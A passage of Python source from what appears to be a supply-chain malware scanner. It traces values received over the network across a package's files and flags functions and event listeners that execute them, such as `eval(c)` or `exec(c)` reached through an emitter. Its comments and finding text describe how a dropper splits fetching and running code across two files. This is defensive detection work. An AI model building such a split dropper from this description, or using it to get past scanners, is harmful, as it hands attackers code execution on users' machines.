    row longer than _DL_LONG_ROW (minified code) is not read (blank)."""
    code, masked, in_block = [], [], False
    for row in text.split("\n"):
        if len(row) > _DL_LONG_ROW:
            code.append("")
            masked.append("")
            continue
        m = _xf_js_mask_line(row) if ("'" in row or '"' in row or "`" in row) else row
        if not in_block and "/" not in m:                  # (no comment starts on it)
            code.append(row)
            masked.append(m)
            continue
        spans, i = [], 0
        while i <= len(m):
            if in_block:
                e = m.find("*/", i)
                if e < 0:
                    spans.append((i, len(m)))
                    break
                spans.append((i, e + 2))
                i, in_block = e + 2, False
                continue
            a = m.find("/*", i)
            lc = _XF_JS_LINE_COMMENT_RE.search(m, i)
            if lc is not None and (a < 0 or lc.start() < a):
                spans.append((lc.start(), len(m)))
                break
            if a < 0:
                break
            e = m.find("*/", a + 2)
            if e < 0:
                spans.append((a, len(m)))
                in_block = True
                break
            spans.append((a, e + 2))
            i = e + 2
        for a, b in spans:
            m = m[:a] + " " * (b - a) + m[b:]
            row = row[:a] + " " * (b - a) + row[b:]
        code.append(row)
        masked.append(m)
    return code, masked


def _xf_js_dirname_specs(code):
    """`code` with each path built from the module's own directory
    (path.join(__dirname, 'x'), __dirname + '/x', `${__dirname}/x`) written
    as the relative specifier it is, './x', padded to the length it replaces."""
    def spec(m):
        rel = m.group("a") if m.group("a") is not None else (m.group("b") or m.group("c"))[1:]
        while rel.startswith("./"):
            rel = rel[2:]
        new = "'./" + rel.lstrip("/") + "'"
        return new.ljust(len(m.group())) if len(new) <= len(m.group()) else m.group()
    return _XF_JS_DIRNAME_RE.sub(spec, code)


def _xf_js_object(mod, rows, masked, k, at, cls):
    """Read the object literal whose '{' is at column `at` of row k as `cls`,
    its members static (see the section comment); the number of members."""
    count, depth, expect = 0, 0, False
    for j in range(k, min(len(masked), k + _XF_OBJECT_ROWS)):
        row, code_row = masked[j], rows[j]
        i = at if j == k else 0
        n = len(row)
        while i < n:
            ch = row[i]
            if expect and depth == 1 and ch != " " and ch != "\t":
                expect = False
                m = _XF_JS_MEMBER_RE.match(code_row, i)
                if m is not None:
                    name = m.group("name")
                    if m.group("method") is not None:
                        ret, params, body = _xf_js_fn(masked, j, m.start("name"))
                        _xf_body(mod, cls + "." + name, params, body)
                    elif m.group("colon") is not None:
                        value = row[m.end():]
                        if _XF_JS_FN_VALUE_RE.match(value.lstrip()):
                            ret, params, body = _xf_js_fn(masked, j, m.end())
                            _xf_body(mod, cls + "." + name, params, body)
                        else:
                            expr = value.split(",")[0]
                            ret = (_xf_has_source(expr), frozenset(_xf_chains(expr)))
                    else:
                        ret = (False, frozenset({name}))             # { pull }: the name it holds
                    _xf_member(mod, cls, name, ret, True)
                    count += 1
            if ch in "{([":
                depth += 1
                if depth == 1:
                    expect = True
            elif ch in "})]":
                depth -= 1
                if depth <= 0:
                    return count
            elif ch == "," and depth == 1:
                expect = True
            i += 1
    return count


def _xf_js_parse(mod, rel):
    """Fill `mod` from its JavaScript text (see the section comment)."""
    if len(mod.text) > _XF_MAX_CHARS:
        return
    rows, masked = _xf_js_views(mod.text)
    code = "\n".join(rows)
    if "__dirname" in code:
        code = _xf_js_dirname_specs(code)
    row_class, row_level = _xf_js_row_classes(masked)
    objects = {}                                # row -> the const an object literal there is read as
    for k, row in enumerate(masked):
        if "{" not in row or row_class[k] is not None or not any(w in row for w in _XF_JS_OBJECT_WORDS):
            continue
        for m in _XF_JS_OBJECT_RE.finditer(row):
            name = m.group("name")
            cls = name if name is not None else "<exports>" if "module" in m.group() else "<default>"
            if _xf_js_object(mod, rows, masked, k, m.end() - 1, cls) and name is not None:
                objects[k] = name
    # (each pattern is tried only where the words it needs are: litellm's and
    # webpack's thousands of files are read in a few seconds)
    for k, row in enumerate(masked):
        cls = row_class[k]
        for m in (_XF_JS_FUNC_RE.finditer(row) if "function" in row else ()):
            if m.group("name") not in mod.defs:
                ret, params, body = _xf_js_fn(masked, k, m.start())
                mod.defs[m.group("name")] = ret
                _xf_body(mod, m.group("name"), params, body)
        if cls is not None:
            for m in (_XF_JS_METHOD_RE.finditer(row) if "{" in row and ")" in row else ()):
                name = m.group("name")
                if name in _XF_JS_KEYWORDS:
                    continue
                ret, params, body = _xf_js_fn(masked, k, m.start("name"))
                _xf_member(mod, cls, name, ret, m.group("static") is not None)
                _xf_body(mod, cls + "." + name, params, body)
            if row_level[k] == 1 and "=" in row:
                f = _XF_JS_FIELD_RE.match(row)
                if f is not None and f.group("name") not in _XF_JS_KEYWORDS and len(f.group("rhs")) <= _DL_LONG_ROW:
                    rhs, name = f.group("rhs"), f.group("name")
                    if _XF_JS_FN_VALUE_RE.match(rhs.lstrip()):              # pull = async () => { … }
                        ret, params, body = _xf_js_fn(masked, k, f.start("rhs"))
                        _xf_body(mod, cls + "." + name, params, body)
                    else:
                        ret = (_xf_has_source(rhs), frozenset(_xf_chains(rhs)))
                    _xf_member(mod, cls, name, ret, f.group("static") is not None)
            continue
        cm = _XF_JS_CLASS_RE.search(row) if "class" in row else None
        if cm is not None:
            mod.classes.setdefault(cm.group("name"), {})
        m = _XF_JS_CONST_RE.search(row) if "=" in row and ("const" in row or "let" in row or "var" in row) else None
        if m is not None and len(m.group("rhs")) <= _DL_LONG_ROW and objects.get(k) != m.group("name"):
            rhs = m.group("rhs")
            if _XF_JS_FN_VALUE_RE.match(rhs.lstrip()):
                ret, params, body = _xf_js_fn(masked, k, m.start("rhs"))
                mod.defs.setdefault(m.group("name"), ret)
                _xf_body(mod, m.group("name"), params, body)
            else:
                mod.defs.setdefault(m.group("name"), (_xf_has_source(rhs), frozenset(_xf_chains(rhs))))
    esm = any(w in code for w in ("export ", "export\t", "export{", "export*"))
    none = ()
    for m in (_XF_JS_EXPORT_DECL_RE.finditer(code) if esm else none):
        mod.exports[m.group("name")] = m.group("name")
    for m in (_XF_JS_EXPORT_DEFAULT_DECL_RE.finditer(code) if esm and "default" in code else none):
        name = m.group("fn") or m.group("cls")
        if name:
            mod.default = name
        elif "function" in m.group(0):
            k = code.count("\n", 0, m.start())
            ret, params, body = _xf_js_fn(masked, k, m.start() - (code.rfind("\n", 0, m.start()) + 1))
            mod.defs["<default>"] = ret
            _xf_body(mod, "<default>", params, body)
            mod.default = "<default>"
    for m in (_XF_JS_EXPORT_DEFAULT_RE.finditer(code) if esm and "default" in code else none):
        mod.default = m.group("name")
    if "<default>" in mod.classes and mod.default is None:
        mod.default = "<default>"                   # export default { … }
    for m in (_XF_JS_EXPORT_LIST_RE.finditer(code) if esm else none):
        for local, exported in _xf_js_destr(m.group("names")):
            mod.exports[exported] = local
    for m in (_XF_JS_EXPORT_FROM_RE.finditer(code) if esm and "from" in code else none):
        key = _xf_js_key(rel, m.group("mod"))
        for name, exported in _xf_js_destr(m.group("names")):
            mod.reexports[exported] = (key, name)
    for m in (_XF_JS_EXPORT_STAR_RE.finditer(code) if esm and "from" in code else none):
        key = _xf_js_key(rel, m.group("mod"))
        if m.group("ns"):
            mod.reexports[m.group("ns")] = (key, None)
        elif key is not None:
            mod.stars.append(key)
    for name in mod.classes.get("<exports>", {}):
        mod.exports.setdefault(name, ("ref", "<exports>." + name))
    cjs = "module" in code
    for m in (_XF_JS_MODEXP_OBJ_RE.finditer(code) if cjs else none):
        for exported, local in _xf_js_destr(m.group("names")):
            mod.exports[exported] = local
    for m in (_XF_JS_MODEXP_PROP_RE.finditer(code) if "exports" in code else none):
        name = m.group("name") or m.group("qname")
        rhs = m.group("rhs").strip().rstrip(";").strip()
        if rhs in ("void 0", "undefined"):
            continue
        if _DL_NAME_RE.fullmatch(rhs) is not None:
            mod.exports[name] = rhs
            continue
        k = code.count("\n", 0, m.start("rhs"))
        at = m.start("rhs") - (code.rfind("\n", 0, m.start("rhs")) + 1)
        local = "exports." + name
        if _XF_JS_FN_VALUE_RE.match(rhs):
            ret, params, body = _xf_js_fn(masked, k, at)
            mod.defs[local] = ret
            _xf_body(mod, local, params, body)
        else:
            expr = masked[k][at:] if k < len(masked) else rhs
            mod.defs[local] = (_xf_has_source(expr), frozenset(_xf_chains(expr)))
        mod.exports[name] = local
    for m in (_XF_JS_MODEXP_ALL_RE.finditer(code) if cjs else none):
        mod.default = m.group("name")
    for m in (_XF_JS_MODEXP_CLASS_RE.finditer(code) if cjs and "class" in code else none):
        mod.default = m.group("name")
    for m in (_XF_JS_MODEXP_REQ_RE.finditer(code) if cjs and "require(" in code else none):
        mod.default_module = _xf_js_key(rel, m.group("mod"))
    for m in (_XF_JS_MODEXP_FN_RE.finditer(code) if cjs else none):
        k = code.count("\n", 0, m.end())
        ret, params, body = _xf_js_fn(masked, k, m.end() - (code.rfind("\n", 0, m.end()) + 1))
        mod.defs["<default>"] = ret
        _xf_body(mod, "<default>", params, body)
        mod.default = "<default>"
    for m in (_XF_JS_DEFINE_RE.finditer(code) if "defineProperty" in code else none):
        mod.exports.setdefault(m.group("name"), ("ref", _XF_SPACE_RE.sub("", m.group("ref"))))
    req, dyn, imp = "require(" in code, "import(" in code, "import" in code and "from" in code
    for rx in ((_XF_JS_REQ_DESTR_RE,) if req else ()) + ((_XF_JS_DYN_DESTR_RE,) if dyn else ()):
        for m in rx.finditer(code):
            key = _xf_js_key(rel, m.group("mod"))
            for exp, local in _xf_js_destr(m.group("names")):
                mod.imports[local] = (key, exp, "name", m.group("mod"))
    for rx in ((_XF_JS_REQ_NS_RE,) if req else ()) + ((_XF_JS_DYN_NS_RE,) if dyn else ()):
        for m in rx.finditer(code):
            mod.imports[m.group("ns")] = (_xf_js_key(rel, m.group("mod")), None, "module", m.group("mod"))
    for m in (_XF_JS_REQ_MEMBER_RE.finditer(code) if req else none):
        mod.imports[m.group("local")] = (_xf_js_key(rel, m.group("mod")), m.group("name"), "name", m.group("mod"))
    for m in (_XF_JS_IMP_NAMED_RE.finditer(code) if imp else none):
        key = _xf_js_key(rel, m.group("mod"))
        for exp, local in _xf_js_destr(m.group("names")):
            mod.imports[local] = (key, exp, "name", m.group("mod"))
    for m in (_XF_JS_IMP_NS_RE.finditer(code) if imp else none):
        mod.imports[m.group("ns")] = (_xf_js_key(rel, m.group("mod")), None, "module", m.group("mod"))
    for m in (_XF_JS_IMP_DEFAULT_RE.finditer(code) if imp else none):
        mod.imports[m.group("name")] = (_xf_js_key(rel, m.group("mod")), "default", "default", m.group("mod"))
    for k, row in enumerate(rows):
        if "env" not in row:
            continue
        for m in _XF_JS_ENV_WRITE_RE.finditer(row):
            var = m.group("a") or m.group("b")
            rhs = masked[k][m.start("rhs"):m.end("rhs")]
            old = mod.env.get(var, (False, frozenset()))
            mod.env[var] = (old[0] or _xf_has_source(rhs), old[1] | _xf_chains(rhs))
    _xf_writes(mod, masked, row_class, "js")


class _XfPackage:
    """One package's modules, what their names resolve to, and which symbols
    hold a received value (see the section comment)."""

    def __init__(self, mods):
        self.mods = mods                          # key -> _XfModule
        self.exported = {}                        # (key, name) -> resolve_export(key, name), from the top

    def resolve_local(self, mod, name, depth=0):
        """What `name` is in `mod`: ('sym', (key, name)), ('class', (key, cls)),
        ('module', key), or None."""
        if depth > _XF_MAX_DEPTH:
            return None
        if name in mod.defs:
            return "sym", (mod.key, name)
        if name in mod.classes:
            return "class", (mod.key, name)
        imp = mod.imports.get(name)
        if imp is not None:
            return self.resolve_import(imp, depth + 1)
        return None

    def resolve_import(self, imp, depth=0):
        key, name, kind, _label = imp
        if key is None:
            return None
        if key not in self.mods:                    # a namespace package: from . import mod
            sub = f"{key}.{name}" if kind == "name" and name else None
            return ("module", sub) if sub in self.mods else None
        if kind == "module":
            return "module", key
        return self.resolve_export(key, name, depth + 1)

    def export(self, key, name):
        """resolve_export(key, name) from the top, remembered (the seeds of
        every module of a package ask for the same exports)."""
        got = self.exported.get((key, name), self)
        if got is self:
            got = self.exported[(key, name)] = self.resolve_export(key, name)
        return got

    def resolve_export(self, key, name, depth=0):
        """What module `key` exports as `name` (see resolve_local)."""
        mod = self.mods.get(key)
        if mod is None or depth > _XF_MAX_DEPTH:
            return None
        if mod.lang == "py":
            got = self.resolve_local(mod, name, depth + 1)
            if got is not None:
                return got
            sub = key + "." + name
            return ("module", sub) if sub in self.mods else None
        if name == "default":
            if mod.default is not None:
                return self.resolve_local(mod, mod.default, depth + 1)
            if mod.default_module is not None:
                return ("module", mod.default_module) if mod.default_module in self.mods else None
            # else exports.default = … (TypeScript's and Babel's output), read below
        exp = mod.exports.get(name)
        if isinstance(exp, tuple):
            return self.resolve_chain(mod, exp[1], None, depth + 1)
        if exp is not None:
            return self.resolve_local(mod, exp, depth + 1)
        re_ = mod.reexports.get(name)
        if re_ is not None:
            if re_[0] is None:
                return None
            return ("module", re_[0]) if re_[1] is None else self.resolve_export(re_[0], re_[1], depth + 1)
        for star in mod.stars + ([mod.default_module] if mod.default_module else []):
            got = self.resolve_export(star, name, depth + 1)
            if got is not None:
                return got
        if mod.default is not None and name != "default":   # module.exports = api: api's members
            return self.resolve_chain(mod, mod.default + "." + name, None, depth + 1)
        return None

    def resolve_chain(self, mod, chain, cls, depth=0):
        """What the member chain `chain` names in `mod` (inside class `cls`:
        self.x / this.x is the class's own member)."""
        parts = chain.split(".")
        if cls is not None and parts[0] in ("self", "this", "cls") and len(parts) >= 2:
            if parts[1] in mod.classes.get(cls, {}):
                return "sym", (mod.key, cls + "." + parts[1])
            return None
        got, used = None, 0
        for i in range(len(parts), 0, -1):          # a dotted import (pkg._net) is one name
            head = ".".join(parts[:i])
            if head in mod.imports or (i == 1 and (head in mod.defs or head in mod.classes)):
                got, used = self.resolve_local(mod, head, depth + 1), i
                break
        rest = parts[used:]
        while got is not None and rest:
            kind, val = got
            if kind == "module":
                got = self.resolve_export(val, rest[0], depth + 1)
            elif kind == "class":
                meths = self.mods[val[0]].classes.get(val[1], {})
                got = ("sym", (val[0], val[1] + "." + rest[0])) if rest[0] in meths else None
            else:
                return got
            rest = rest[1:]
        return got

    def symbols(self):
        """{(key, name): (mod, source, refs, cls)} of every function, value,
        member and environment variable write, at most _XF_MAX_SYMBOLS."""
        out = {}
        for mod in self.mods.values():
            for name, (source, refs) in mod.defs.items():
                out[(mod.key, name)] = (mod, source, refs, None)
            for cls, meths in mod.classes.items():
                for meth, ((source, refs), _static) in meths.items():
                    out[(mod.key, cls + "." + meth)] = (mod, source, refs, cls)
            for var, (source, refs) in mod.env.items():
                out[(mod.key, "<env>." + var)] = (mod, source, refs, None)
            if len(out) >= _XF_MAX_SYMBOLS:
                break
        return out

    def tainted(self):
        """The symbols that hold a received value (see the section comment)."""
        syms = self.symbols()
        edges = {}
        for sym, (mod, _source, refs, cls) in syms.items():
            found = []
            for chain in refs:
                got = self.resolve_chain(mod, chain, cls)
                if got is not None and got[0] == "sym":
                    found.append(got[1])
            edges[sym] = found
        tainted = {sym for sym, (_m, source, _r, _c) in syms.items() if source}
        for _ in range(_XF_ROUNDS):
            grew = {sym for sym, found in edges.items() if sym not in tainted and any(f in tainted for f in found)}
            if not grew:
                break
            tainted |= grew
        return tainted

    def runners(self):
        """The functions that run a parameter as code (def execute(c):
        exec(c)): their body read by the single-file detector with the
        parameters seeded. At most _XF_MAX_RUNNERS bodies are read. (The
        detection round) Then a function that hands a parameter to one of
        them — the runner in another file or in its own (def go(c):
        execute(c)) — runs it too, up to _XF_ROUNDS hops: a relay's body is
        read with its parameters seeded and the names that name a runner in
        its module as runners, at most _XF_MAX_RUNNERS a round."""
        out = self.direct_runners()
        relays = []                                 # (a body that names a runner may still only hand it on)
        for mod in self.mods.values():
            for sym, (params, body) in list(mod.bodies.items()) + list(mod.relays.items()):
                names = sorted(set(params) - _XF_NOT_PARAMS)
                if names and (mod.key, sym) not in out:
                    relays.append((mod, sym, names, "\n".join(body)))
        for _ in range(_XF_ROUNDS):
            if not out or not relays:
                break
            running, seeds_of, grew, read = _xf_marked_members(self, out), {}, set(), 0
            for mod, sym, names, text in relays:
                if (mod.key, sym) in out:
                    continue
                if mod.key not in seeds_of:
                    seeds = set(_xf_seeds(self, mod, out, {}, running)[0])
                    seeds_of[mod.key] = sorted(seeds | {n for k, n in out if k == mod.key and "." not in n})
                found = [n for n in seeds_of[mod.key] if n in text][:_XF_MAX_SEEDS]
                if not found:
                    continue
                read += 1
                if read > _XF_MAX_RUNNERS:
                    break
                res = _received_code_kind(text, extra_always=names, extra_runners=found)
                if res is not None and res[1] == "run":
                    grew.add((mod.key, sym))
            if not grew:
                break
            out |= grew
        return out

    def direct_runners(self):
        """The functions whose own body runs a parameter (see runners)."""
        out, count = set(), 0
        for mod in self.mods.values():
            for sym, (params, body) in mod.bodies.items():
                names = sorted(set(params) - _XF_NOT_PARAMS)
                if not names:
                    continue
                count += 1
                if count > _XF_MAX_RUNNERS:
                    return out
                res = _received_code_kind("\n".join(body), extra_always=names)
                if res is not None and res[1] == "run":
                    out.add((mod.key, sym))
        return out

    def names_of(self, key, depth=0):
        """The names module `key` exports, for its members (m.pull)."""
        mod = self.mods.get(key)
        if mod is None or depth > _XF_MAX_DEPTH:
            return set()
        if mod.lang == "py":
            return set(mod.defs) | set(mod.classes) | {n for n in mod.imports if not n.startswith("*")}
        out = set(mod.exports) | set(mod.reexports)
        for star in mod.stars + ([mod.default_module] if mod.default_module else []):
            out |= self.names_of(star, depth + 1)
        return out


def _xf_instances(text, expr, lang):
    """Local names — or an instance's own, self.c / this.c — assigned an
    instance of the class named by `expr` (`v = C(…)`, `this.c = new ns.C(…)`)."""
    new = r"(?:new[ \t]+)?" if lang == "js" else ""
    rx = re.compile(r"(?<![\w$.])(?P<var>(?:(?:self|this)[ \t]*\.[ \t]*)?[A-Za-z_$][\w$]*)[ \t]*=[ \t]*" + new
                    + re.escape(expr) + r"[ \t]*\(")
    return {_XF_SPACE_RE.sub("", m.group("var")) for m in rx.finditer(text)}


def _xf_marked_members(pkg, marked):
    """{(module key, class): [(member, static)]} of the `marked` members, in
    the class's order: what _xf_seeds reads of a class, once per package."""
    out = {}
    for mod in pkg.mods.values():
        for cls, meths in mod.classes.items():
            got = [(meth, static) for meth, (_ret, static) in meths.items() if (mod.key, cls + "." + meth) in marked]
            if got:
                out[(mod.key, cls)] = got
    return out


def _xf_seeds(pkg, mod, marked, envs, members=None):
    """({chain: where it comes from}, [(expr, member, label)]) for module
    `mod`: the names that name a `marked` symbol in it (see the section
    comment), and the classes whose member a new instance's call reaches
    directly (C().pull()). `members`: _xf_marked_members(pkg, marked)."""
    seeds, direct = {}, []
    code = mod.text
    if members is None:
        members = _xf_marked_members(pkg, marked)

    def add_class(expr, val, label):
        for meth, static in members.get(val, ()):
            if static:
                seeds[expr + "." + meth] = label
                continue
            for var in sorted(_xf_instances(code, expr, mod.lang)):
                seeds[var + "." + meth] = label
            direct.append((expr, meth, label))

    def add(expr, got, label, depth=0):
        if got is None or depth > 2:
            return
        kind, val = got
        if kind == "sym":
            if val in marked:
                seeds[expr] = label
        elif kind == "class":
            add_class(expr, val, label)
        elif kind == "module":
            for name in sorted(pkg.names_of(val))[:_XF_MAX_SEEDS * 4]:
                sub = pkg.export(val, name)
                if sub is not None and sub[0] != "module":
                    add(expr + "." + name, sub, label, depth + 1)
            if val in pkg.mods and pkg.mods[val].lang == "js":      # (a re-export may name a missing module)
                add(expr, pkg.export(val, "default"), label, depth + 1)

    for local, imp in mod.imports.items():
        if local.startswith("*"):
            if imp[0] in pkg.mods:
                for name in sorted(pkg.names_of(imp[0])):
                    add(name, pkg.export(imp[0], name), imp[3])
            continue
        got = pkg.resolve_import(imp)
        if got is None and mod.lang == "js" and imp[2] == "default" and imp[0] in pkg.mods:
            got = ("module", imp[0])                 # a CommonJS module imported by default is its exports
        add(local, got, imp[3])
    for var, label in envs.items():
        if var in code:
            seeds[("environ." if mod.lang == "py" else "process.env.") + var] = label
    return seeds, direct


def _xf_rewrite(code, direct, lang):
    """`code` with each call of a method on a new instance (`C().pull`,
    `new ns.C(x).pull`) read as one seeded name, padded to its length;
    returns (code, {name: label})."""
    names = {}
    for n, (expr, meth, label) in enumerate(direct[:_XF_MAX_SEEDS]):
        new = r"(?:new[ \t]+)?" if lang == "js" else ""
        rx = re.compile(r"(?<![\w$.])" + new + re.escape(expr) + r"[ \t]*\([^()\n]{0,200}\)[ \t]*\.[ \t]*"
                        + re.escape(meth) + r"(?![\w$])")
        name = f"_xf{n}"
        code, count = rx.subn(lambda m: name.ljust(len(m.group())), code)
        if count:
            names[name] = label
    return code, names


# (0.1.8) An event emitter between files: one file emits a value it received
# on an event (`bus.emit('code', c)`), another listens for that event on the
# same emitter — the object one module defines and the other imports, or a
# global such as process — and runs what its listener is given
# (`bus.on('code', (c) => eval(c))`, `bus.on('code', eval)`). The emitting file
# is read by the single-file detector with its emits of that event read as a
# call of a code runner (`_xfe(c)`), which says whether a received value is
# emitted; the listening file is then read with the listener's parameter
# seeded (for a handler given by name, a call of it on a seeded name is read
# after the file). npm packages only (Python's event libraries are not read);
# the first _XF_EMIT_MAX emits and listeners of a file are. An emit or a
# listener in a comment is not one (in a file that reads its own source it is,
# as _import_code reads that file); a file's comments are read only where an
# emit meets a listener, and its emits and listeners where its member calls
# are (_xf_calls): a bundle is not lexed or read position by position.
_XF_EMIT_RE = re.compile(
    r"(?<![\w$.])(?P<obj>[A-Za-z_$][\w$]*)[ \t]*\.[ \t]*emit[ \t]*\([ \t]*(?P<q>['\"`])(?P<event>[^'\"`\n]{1,100})"
    r"\2[ \t]*,")
_XF_LISTEN_RE = re.compile(
    r"(?<![\w$.])(?P<obj>[A-Za-z_$][\w$]*)[ \t]*\.[ \t]*(?:on|once|addListener|prependListener|prependOnceListener)"
    r"[ \t]*\([ \t]*(?P<q>['\"`])(?P<event>[^'\"`\n]{1,100})\2[ \t]*,[ \t]*"
    r"(?:(?:async[ \t]+)?(?:function\b[ \t]*[\w$]*[ \t]*\([ \t]*(?P<fp>[A-Za-z_$][\w$]*)"
    r"|\([ \t]*(?P<ap>[A-Za-z_$][\w$]*)[^)\n]*\)[ \t]*=>|(?P<bp>[A-Za-z_$][\w$]*)[ \t]*=>)"
    r"|(?P<handler>[A-Za-z_$][\w$]*(?:[ \t]*\.[ \t]*[A-Za-z_$][\w$]*){0,3})[ \t]*[,)])")
_XF_EMIT_AT_RE = re.compile(r"\.[ \t]*emit[ \t]*\(")           # the member calls they make (_xf_calls)
_XF_LISTEN_AT_RE = re.compile(r"\.[ \t]*(?:on|once|addListener|prependListener|prependOnceListener)[ \t]*\(")
_XF_EMIT_NEEDLE = "emit"         # a file without it emits nothing
_XF_EMIT_GLOBALS = frozenset(("process",))   # the emitters every file shares by name
_XF_EMIT_MAX = 50                # emits and listeners read per file


def _xf_emitter_of(pkg, mod, name):
    """What an emitter's name is in `mod`, the same in every file that names
    it: what an import of it resolves to (or the import itself), a symbol of
    the module, or a global every file shares (process). None for any other
    name — `this`, a parameter, a local of a function — which is its file's
    own: two classes' `this.emit` and `this.on` are two emitters."""
    imp = mod.imports.get(name)
    if imp is not None:
        got = pkg.resolve_import(imp)
        return got if got is not None else ("import", imp[0], imp[1])
    got = pkg.resolve_local(mod, name)
    if got is not None:
        return got
    return ("global", name) if name in _XF_EMIT_GLOBALS else None


def _xf_calls(rx, at_re, text):
    """rx.finditer(text), for _XF_EMIT_RE (at_re: _XF_EMIT_AT_RE) and
    _XF_LISTEN_RE (_XF_LISTEN_AT_RE), read only where at_re finds the member
    call a match makes: a match is the identifier before that call's '.'
    (spaces and tabs between) and the call, so it can only start where that
    identifier does. The same matches, where the full reading tries every
    position of a bundle."""
    end = 0
    for at in at_re.finditer(text):
        k = at.start()
        while k > 0 and text[k - 1] in " \t":
            k -= 1
        s = k
        while s > 0 and (text[s - 1].isalnum() or text[s - 1] in "_$"):     # [\w$]
            s -= 1
        if s == k or s < end:                           # no identifier; inside the last match
            continue
        m = rx.match(text, s)
        if m is not None:
            end = m.end()
            yield m


def _xf_emitter_seeds(pkg, tainted, envs, held):
    """{module key: ({name: label}, [rows], line)}: for each file that listens
    for an event another file emits a received value on (see above), the
    names its listeners are given, the calls read after the file for a
    handler given by name, and the line of its first such listener."""
    emits, listens = {}, {}
    for mod in pkg.mods.values():
        if mod.lang != "js" or _XF_EMIT_NEEDLE not in mod.text:
            continue
        for k, m in enumerate(_xf_calls(_XF_EMIT_RE, _XF_EMIT_AT_RE, mod.text)):
            if k >= _XF_EMIT_MAX:
                break
            emitter = _xf_emitter_of(pkg, mod, m.group("obj"))
            if emitter is not None:
                emits.setdefault((emitter, m.group("event")), {}).setdefault(mod.key, []).append(m)
    # a listener only matters for an event something emits: a file without any such event's name is not read
    events = {event for _emitter, event in emits}
    for mod in pkg.mods.values():
        if mod.lang != "js" or not any(event in mod.text for event in events):
            continue
        for k, m in enumerate(_xf_calls(_XF_LISTEN_RE, _XF_LISTEN_AT_RE, mod.text)):
            if k >= _XF_EMIT_MAX:
                break
            emitter = _xf_emitter_of(pkg, mod, m.group("obj"))
            if emitter is not None:
                listens.setdefault((emitter, m.group("event")), []).append((mod.key, m))
    comments, codes = {}, {}

    def is_code(key, m):
        """Is match m of module `key` code, not in a comment? (A file's
        comments are read once, and only where an emit meets a listener.)"""
        if key not in comments:
            text = pkg.mods[key].text
            comments[key] = [] if reads_own_source(text) else _lex_comment_spans(text, "js")
        spans = comments[key]
        k = bisect.bisect_left(spans, (m.end(),)) - 1       # the last comment that starts before m ends
        return k < 0 or spans[k][1] <= m.start()

    out = {}
    for chan, by_mod in emits.items():
        for key, ms in sorted(by_mod.items(), key=lambda one: one[0]):
            heard = [(lkey, m) for lkey, m in listens.get(chan, ()) if lkey != key]
            objs = {m.group("obj") for m in ms if is_code(key, m)} if heard else set()
            heard = [(lkey, m) for lkey, m in heard if is_code(lkey, m)] if objs else []
            if not heard:
                continue
            if key not in codes:
                codes[key] = _import_code(pkg.mods[key].text, "js")
            code = codes[key]
            for obj in sorted(objs):
                rx = re.compile(r"(?<![\w$.])" + re.escape(obj) + r"[ \t]*\.[ \t]*emit[ \t]*\([ \t]*(['\"`])"
                                + re.escape(chan[1]) + r"\1[ \t]*,")
                code = rx.sub(lambda m: "_xfe(".ljust(len(m.group())), code)
            seeds = _xf_seeds(pkg, pkg.mods[key], tainted, envs, held)[0] if tainted else {}
            res = _received_code_kind(code, extra_always=sorted(seeds)[:_XF_MAX_SEEDS], extra_runners=["_xfe"])
            if res is None or res[1] != "run":
                continue
            for lkey, m in heard:
                param = m.group("fp") or m.group("ap") or m.group("bp")
                handler = m.group("handler")
                line = pkg.mods[lkey].text.count("\n", 0, m.start()) + 1
                names, rows, first = out.setdefault(lkey, ({}, [], line))
                if param is not None:
                    names[param] = key
                elif handler is not None:
                    names["_xfr"] = key
                    rows.append(f"{handler}(_xfr)")
                out[lkey] = (names, rows, min(first, line))
    return out


_XF_WHY = (
    "A dropper can split what it downloads and the code that runs it across two files of a "
    "package, so neither file shows the shape alone: one fetches, the other runs what the "
    "first returns. Running code a server sends is the shape no library needs — whoever "
    "controls the server chooses what runs.")
# the finding's texts (module-level, so the native engine's rule pack carries them):
# {where} is the files the value comes from; the second of each pair is a runner's
_XF_RULE = {"id": "SC-IMPORT-RISK", "name": "Risky import-time code", "type": "HOTSPOT", "why": _XF_WHY,
            "ref": "CWE-506 · Supply chain"}
_XF_TAILS = ("the value is received in another file of the package ({where})",
             "the function that runs it is in another file of the package ({where})")
_XF_FIXES = ("Read both files: what does {where} receive, and what runs it here?",
             "Read both files: what does this file receive, and what does {where} run?")


def _xf_issue(path, line, text, cat, srcs, who="Dependency code", runner=False):
    """The follower's SC-IMPORT-RISK finding; `who` starts the message ("Dependency
    code"; a registry scan names the file). `runner`: the value is received
    here and run by a function of another file."""
    lines = text.split("\n")
    where = ", ".join(srcs)
    tail = _XF_TAILS[runner].format(where=where)
    return mk_issue(
        dict(_XF_RULE, sev=import_time_severity([_DL_CATEGORY_REASON[cat]]),
             msg=f"{who} {_DL_CATEGORY_REASON[cat]}; {tail}.", fix=_XF_FIXES[runner].format(where=where)),
        path, line, lines, redactor=_Redactor(lines))


def _xf_py_module(path):
    """(top package, dotted module, is_package) for a dependency .py file under
    site-packages / dist-packages / vendor, else None. __init__.py is its own
    package; another file is <pkg>…<stem>."""
    parts = path.replace(os.sep, "/").split("/")
    idx = max((len(parts) - 1 - parts[::-1].index(m) for m in _XF_DEP_MARKERS if m in parts), default=-1)
    rel = parts[idx + 1:] if 0 <= idx < len(parts) - 1 else []
    if not rel or not rel[-1].endswith(".py"):
        return None
    stem = rel[-1][:-3]
    is_pkg = stem == "__init__"
    mod_parts = rel[:-1] if is_pkg else rel[:-1] + [stem]
    if not mod_parts:
        return None
    return rel[0], ".".join(mod_parts), is_pkg


def _xf_resolve(mod_spec, pkg_parts):
    """Resolve an import's module spec (absolute 'a.b', or relative '.a' / '..a')
    against the importing module's package parts, to a dotted module or None."""
    dots = len(mod_spec) - len(mod_spec.lstrip("."))
    rest = mod_spec[dots:]
    if dots == 0:
        return rest or None
    keep = len(pkg_parts) - (dots - 1)
    if keep < 0:
        return None
    target = pkg_parts[:keep] + (rest.split(".") if rest else [])
    return ".".join(target) or None


def _xf_js_package(path):
    """The npm package root ('/'-separated) a dependency file lives in
    (node_modules/<name> or node_modules/@scope/<name>, innermost), else None."""
    parts = path.replace(os.sep, "/").split("/")
    for i in range(len(parts) - 2, -1, -1):
        if parts[i] == "node_modules":
            if parts[i + 1].startswith("@") and i + 2 < len(parts):
                return "/".join(parts[:i + 3])
            return "/".join(parts[:i + 2])
    return None


def _xf_js_norm(rel):
    """A package-relative JS path as a module key: extension dropped, /index dropped."""
    for ext in (".js", ".cjs", ".mjs", ".jsx", ".json"):
        if rel.endswith(ext):
            rel = rel[:-len(ext)]
            break
    return rel[:-6] if rel.endswith("/index") else rel


def _xf_package_issues(mods, skip, who):
